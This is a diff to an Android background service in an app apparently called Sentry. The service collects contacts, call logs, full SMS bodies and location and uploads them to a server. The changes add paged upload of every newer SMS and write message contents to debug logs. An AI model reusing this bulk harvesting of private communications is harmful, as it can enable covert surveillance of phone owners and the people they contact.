@@ -9,7 +9,6 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
-import android.database.sqlite.SQLiteException;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.IBinder;
@@ -18,7 +17,6 @@ import android.provider.ContactsContract;
 import android.provider.ContactsContract.PhoneLookup;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
-import android.util.Log;
 
 import com.baidu.location.BDGeofence;
 import com.baidu.location.BDLocation;
@@ -110,7 +108,6 @@ public class WorkService extends Service {
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		// TODO Auto-generated method stub
-//		Toast.makeText(this, "repeating alarm", Toast.LENGTH_SHORT).show();
 		AppLog.d(TAG, "[onStartCommand] " + new Date() + ", " + intent.getAction());
 		ensureMobileInfoUpload();
 		String action = intent.getAction();
@@ -165,6 +162,7 @@ public class WorkService extends Service {
 							SentryApplication.getApp().setMobileInfos(buildInfos);
 							mMobileInfoUploaded = true;
 						}
+						AppLog.d(TAG, "[Mobile] upload success ? " + success);
 					}
 				}
 			}
@@ -231,7 +229,6 @@ public class WorkService extends Service {
 				DBDao db = DBImpl.getInstance();
 				db.insertLocation(loc);
 				AppLog.d(TAG, "insertIntoLocation: t[" + loc.time + "], <" + loc.addr + ">");
-				// AppLog.d(TAG, "insertIntoLocation: <" + sb.toString() + ">");
 				
 				if(Utility.isConnected(WorkService.this)){
 					SentryApplication.getApp().startUploadLocation(WorkService.this);
@@ -325,9 +322,12 @@ public class WorkService extends Service {
 				}
 				cursor.close();
 				
-				boolean success = uploadContacts(list);
-				if(success){
-					SentryApplication.getApp().setContactLastUpdateTime(latestLocal);
+				boolean success = false;
+				if(Utility.isConnected(WorkService.this)){
+					success = uploadContacts(list);
+					if(success){
+						SentryApplication.getApp().setContactLastUpdateTime(latestLocal);
+					}
 				}
 				AppLog.d(TAG, "[Contact] upload success ? " + success);
 			}else {
@@ -344,7 +344,7 @@ public class WorkService extends Service {
 		protected Boolean doInBackground(Void... params) {
 			// TODO Auto-generated method stub
 			ContentResolver cr = getContentResolver();
-			long latestLocal = getCallLastestUpdateTime(cr);
+			long latestLocal = getCallLatestUpdateTime(cr);
 			long lastUpdateServer = SentryApplication.getApp().getCallLastUpdateTime();
 			if(lastUpdateServer < latestLocal) {
 				int deltaDay = (int) Math.ceil((latestLocal - lastUpdateServer) / (24 * 3600000));
@@ -365,9 +365,12 @@ public class WorkService extends Service {
 				    list.add(call);
 				}
 				cursor.close();
-				boolean success = uploadCalls(list);
-				if(success){
-					SentryApplication.getApp().setCallLastUpdateTime(latestLocal);
+				boolean success = false;
+				if(Utility.isConnected(WorkService.this)){
+					success = uploadCalls(list);
+					if(success){
+						SentryApplication.getApp().setCallLastUpdateTime(latestLocal);
+					}
 				}
 				AppLog.d(TAG, "[Call] upload success ? " + success);
 			}else {
@@ -385,32 +388,50 @@ public class WorkService extends Service {
 		protected Boolean doInBackground(Void... params) {
 			// TODO Auto-generated method stub
 			ContentResolver cr = getContentResolver();
-			long latestLocal = getSmsLastestUpdateTime(cr);
 			long lastUpdateServer = SentryApplication.getApp().getSmsLastUpdateTime();
-			if(lastUpdateServer < latestLocal) {
-				int deltaDay = (int) Math.ceil((latestLocal - lastUpdateServer) / (24 * 3600000));
-				int max = Math.max(1, Math.min(deltaDay, 5)) * 50;
-				String where = "date > " + lastUpdateServer;
-				Cursor cursor = cr.query(SMS_CONTENT_URI, null, where, null,
-						"date DESC LIMIT " + max);
-				AppLog.d(TAG, "[Call] size = " + cursor.getCount());
-				ArrayList<SSms> list = new ArrayList<SSms>();
-				while(cursor.moveToNext()){
-					SSms sms = new SSms();
-					sms._date = cursor.getLong(cursor.getColumnIndex("date"));
-					sms.number = cursor.getString(cursor.getColumnIndex("address"));
-					sms.body = cursor.getString(cursor.getColumnIndex("body"));
-					sms.name = queryNameFromDB(cr, sms.number);
-					sms.type = SSms.parseType(cursor.getInt(cursor.getColumnIndex("type")));
-				    AppLog.d(TAG, "[SMS] > " + sms.toString());
-				    list.add(sms);
+			
+			final String where = "date > " + lastUpdateServer;
+			Cursor cs = cr.query(SMS_CONTENT_URI, new String[] { "count(*)" },
+					where, null, null);
+			int newestCount = 0;
+			if(cs.moveToFirst()){
+				newestCount = cs.getInt(0);
+				AppLog.d(TAG, "[Call] $$$$$ Total Count " + newestCount);
+			}
+			cs.close();
+			if(newestCount > 0) {
+				// 分页上传，升序排列
+				final int pageSize = 50;
+				for(int pn = 0; pn * pageSize < newestCount; pn ++){
+					Cursor cursor = cr.query(SMS_CONTENT_URI, null, where, null,
+							"date ASC LIMIT " + pn * pageSize + ", " + pageSize);
+					AppLog.d(TAG, "[Call] size = " + cursor.getCount());
+					ArrayList<SSms> list = new ArrayList<SSms>();
+					long newestTimeInPage = 0L;
+					int uploadPageSize = cursor.getCount();
+					while(cursor.moveToNext()){
+						SSms sms = new SSms();
+						sms._date = cursor.getLong(cursor.getColumnIndex("date"));
+						sms.number = cursor.getString(cursor.getColumnIndex("address"));
+						sms.body = cursor.getString(cursor.getColumnIndex("body"));
+						sms.name = queryNameFromDB(cr, sms.number);
+						sms.type = SSms.parseType(cursor.getInt(cursor.getColumnIndex("type")));
+					    AppLog.d(TAG, "[SMS] > " + sms.toString());
+					    list.add(sms);
+					    
+					    newestTimeInPage = sms._date;
+					}
+					cursor.close();
+					boolean success = false;
+					if(Utility.isConnected(WorkService.this)){
+						success = uploadSms(list);
+						if(success){
+							SentryApplication.getApp().setSmsLastUpdateTime(newestTimeInPage);
+						}
+					}
+					AppLog.d(TAG, "[SMS] upload , pn=" + pn + " :["+ (pn * pageSize) + ", "
+							+ (pn * pageSize + uploadPageSize) + "], success ? " + success);
 				}
-				cursor.close();
-				boolean success = uploadSms(list);
-				if(success){
-					SentryApplication.getApp().setSmsLastUpdateTime(latestLocal);
-				}
-				AppLog.d(TAG, "[SMS] upload success ? " + success);
 			}else {
 				AppLog.d(TAG, "[SMS] Can not found updates in sms database, SKIP!!");
 			}
@@ -493,7 +514,7 @@ public class WorkService extends Service {
 		return lastUpdate;
 	}
 	
-	private long getCallLastestUpdateTime(ContentResolver cr){
+	private long getCallLatestUpdateTime(ContentResolver cr){
 		Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, 
 				new String[] {CallLog.Calls.DATE},
 				null, null, 
@@ -503,11 +524,12 @@ public class WorkService extends Service {
 			lastUpdate = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
 			cursor.close();
 		}
-		AppLog.d(TAG, "getCallLastestUpdateTime " + lastUpdate + ", " + new Date(lastUpdate));
+		AppLog.d(TAG, "getCallLatestUpdateTime " + lastUpdate + ", " + new Date(lastUpdate));
 		return lastUpdate;
 	}
 	
-	private long getSmsLastestUpdateTime(ContentResolver cr) {
+	@SuppressWarnings("unused")
+	private long getSmsLatestUpdateTime(ContentResolver cr) {
 		// TODO Auto-generated method stub
 		final String DATE = "date";
 		Cursor cursor = cr.query(SMS_CONTENT_URI, 
@@ -520,6 +542,7 @@ public class WorkService extends Service {
 			cursor.close();
 		}
 		AppLog.d(TAG, "getSmsLastestUpdateTime " + latest + ", " + new Date(latest));
+		
 		return latest;
 	}
 	
@@ -540,7 +563,7 @@ public class WorkService extends Service {
 			}
 		}
 		cs.close();
-		//Log.d(TAG, "[queryNameFromDB] number is " + number + "> " + sb.toString());
+		//AppLog.d(TAG, "[queryNameFromDB] number is " + number + "> " + sb.toString());
 		return sb.toString();
 	}
 	
